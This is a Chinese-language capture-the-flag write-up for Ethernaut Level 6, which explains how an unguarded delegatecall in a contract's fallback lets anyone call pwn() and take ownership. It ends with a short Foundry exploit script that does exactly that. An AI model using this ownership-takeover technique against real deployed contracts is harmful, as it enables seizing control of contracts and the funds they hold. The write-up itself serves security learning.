# Level 6 - Delegation
## 題目
[Delegation](https://ethernaut.openzeppelin.com/level/0x73379d8B82Fda494ee59555f333DF7D44483fD58)

### 通關條件
這一關的目標是取得創建實例的所有權。

### 提示
- 仔細看 solidity 文件關於 delegatecall 的低階函式。它是如何怎麽運行，如何委派操作給鏈上函式函式庫，以及它對執行時期作用範圍的影響
- fallback 方法(method)
- 方法(method)的 ID
### 合約內容
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```
## 解題
### delegatecall
delegatecall 就像是委託行函數

通常 call 一個 function 的時候，都是等待 function 完成接收 return，舉例來說：A 合約去呼叫 B 合約的 function，不論 B 合約做了什麼，都是更改 B 合約裡的內容（變數），頂多最後 return 一些內容給 A ，但還是由 A 決定這些內容要被放置於哪個變數中。

但如果今天用 delegatecall 的方式，執行的雖然是 B 合約的 function，但是當 function 有改變變數時，會是更動 A 合約裡的變數（所以 A 和 B 合約的變數宣告要相同，才可以進行 delegatecall）。
關於 delegatecall，[[中文] WTF Solidity极简入门: 23. Delegatecall](https://github.com/AmazingAng/WTF-Solidity/tree/main/23_Delegatecall) 有更完整的解釋。


### fallback method
fallback 在 [Level 1 - Fallback](https://hackmd.io/@D13/ethernaut1#fallback-%E6%96%B9%E6%B3%95) 中有提到，這裡不再贅述。
### 方法(method)的 ID
Method ID 是函數簽名（Function Signature）經過 Keccak Hash 後的前 4 個 bytes，用於讓程式知道應該要跑哪一個 function，因為其實這題用到的沒有很深，所以先不深入說明，有興趣的可以看：
- [[中文] WTF Solidity极简入门: 29. 函数选择器Selector
](https://github.com/AmazingAng/WTF-Solidity/tree/main/29_Selector#method-idselector%E5%92%8C%E5%87%BD%E6%95%B0%E7%AD%BE%E5%90%8D)
- [[EN] What is a Method ID?](https://info.etherscan.com/what-is-method-id/)


---
研究完提示後，看回合約。這題目標是拿到合約 `Delegation` 的 owner，但是這個合約本身沒有修改 owner 的功能，但是另一個合約 `Delegate` 有這個功能。
所以只要 `Delegation` delegatecall `Delegate` 的 `pwn()`，就可以修改 `Delegation` 的變數 `owner`。而 `Delegation` 的 delegatecall，就在 `fallback()` 之中：
```solidity=25
    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
```
所以我們只要轉帳給 `Delegation` 合約，並且將 `pwn()` 的 Method ID 作為交易資料 `msg.data` 送出即可，轉帳的方法在 [Level 1 - Fallback](https://hackmd.io/@D13/ethernaut1#%E5%A6%82%E4%BD%95%E9%80%8F%E9%81%8E%E8%88%87-ABI-%E4%BA%92%E5%8B%95%E7%99%BC%E9%80%81-ether%EF%BC%9F) 有提過
用 `call` 來轉帳並帶上參數可以看 [WTF Solidity极简入门: 22. Call](https://github.com/AmazingAng/WTF-Solidity/tree/main/22_Call)
攻擊合約如下：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/06_Delegation.sol";

contract ExploitScript is Script {
    Delegation public level06 = Delegation(payable(your_challenge_address));

    function run() external {
        vm.startBroadcast();
        
        address(level06).call(abi.encodeWithSignature("pwn()"));

        vm.stopBroadcast();
    }
}
```